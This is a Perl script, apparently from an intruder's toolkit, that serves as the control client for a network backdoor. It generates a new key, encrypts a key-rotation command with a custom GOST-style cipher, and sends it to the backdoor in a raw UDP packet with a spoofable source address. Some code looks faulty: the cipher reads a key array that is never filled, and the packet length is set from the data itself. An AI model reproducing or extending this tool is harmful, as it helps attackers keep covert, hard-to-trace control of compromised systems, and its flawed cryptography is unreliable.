#!/usr/bin/perl
# this is the client that i created to make the keys, and 
# send a copy to the backdoor. it will use the existing key 
# to scramble the new key for the backdoor.
# (plastek)

use Net::RawIP;
require 'getopts.pl';

Getopts('o:d:p:s:');
die "Usage: $0 -o (origin) -d (destination) -p (port) -s (source port)"
	unless ($opt_o && $opt_d && $opt_p && $opt_s);
my ($origin, $destip, $destport, $sport) = ($opt_o, $opt_d, $opt_p, $opt_s);
&make_key;

open(OKEY, "< .key");
for my $line(<OKEY>){
	$key = $line;
}
close OKEY;

open(KFILE, "< .tkey");
for my $line(<KFILE>){
	$new_key = $line;
}
close KFILE;

my $command = "nike::$new_key";
$blew = Gh0ST0r->new($key);
# crypt
$data = $blew->egadz($command);
$blow = Gh0ST0r->new($key);
$dn = $blow->gee_golly($data);
print "$dn\n";
# print "$command\n $key\n $data\n";
system('mv .tkey .key');
my $p = new Net::RawIP({udp	=>{
				source  => $sport,
				dest 	=> $destport,
				len  	=> $data,
				data	=> $data}});			
	$p->set({ip => 	{ saddr => "$origin",
			daddr	=> "$destip"}

	});

$p->send();
sub make_key {
		$u1 = 6666666 * rand();
		$u2 = $u1 * rand() + 6666666;
		$u3 = $u2 * rand() + $u2;
		$u4 = $u3 * rand() + $u2;
		$s = chr(ord('s') + $u1);
		$S = chr(ord('q') * $u1);
		$e = chr(ord('e') * $u4);
		$E = chr(ord('E') * $u2);
		$x = chr(ord('x') * $u4);
		open(KEY, "> .tkey");
		print KEY "$S$s$e$E$x";
		close KEY;
		system('chmod 600 ./.tkey');
}

package Gh0ST0r;

use vars qw( @b @t @R @S @h @o @K);

sub new {
    my ( $argument, $pp ) = @_;
    Setup( $pp );
    my $class = ref ( $argument ) || $argument;
    my $self = {};
    bless $self, $class;
    return $self;
} 

sub egadz {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax );
}

sub gee_golly {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax, 1 );
}

sub Gh0ST {
    my ( $v, $w, $a, $q, $c, $out, $self );
    my ( $e, $d ) = @_;
    @h = 0 .. 7;
    @o = reverse @h;
    while ( $a < length $e ) {
        $v = N( $e, $a );
        $w = N( $e, ( $a += 8 ) - 4 );
        grep $q++ % 2 ? $v ^= F( $w + $K[ $_ ] ) : ( $w ^= F( $v + $K[ $_ ] ) ), $d ? ( @h, ( @o ) x 3 ) : ( ( @h ) x 3, @o );
        $out .= pack N2, $w, $v;
    }
    return $out;
}

sub F {
    my $u = 0;
    grep $u |= $S[ $_ ][ $_[ 0 ] >> $_ * 4 & 15 ] << $_ * 4, reverse 0 .. 7;
    return $u << 11 | $u >> 21;
}

sub R {
    return int( (shift) * rand );
}

sub N {
    return vec $_[ 0 ], $_[ 1 ] / 4, 32;
}

sub Setup {
    my $p = shift;
    my ( $s, $i, $c );
    for ( $i = 0; $i < length $p; $i += 4 ) {
        srand( $s ^= N( $p, $i ) );
    }
    @b = @t = 0 .. 15;
    while ( $c < 8 ) {
        grep { push @b, splice @b, R( 9 ), 5 } @t;
        $R[ $c ] = R( 2**32 );
        @{ $S[ $c++ ] } = @b;
    }

}

1;
__END__
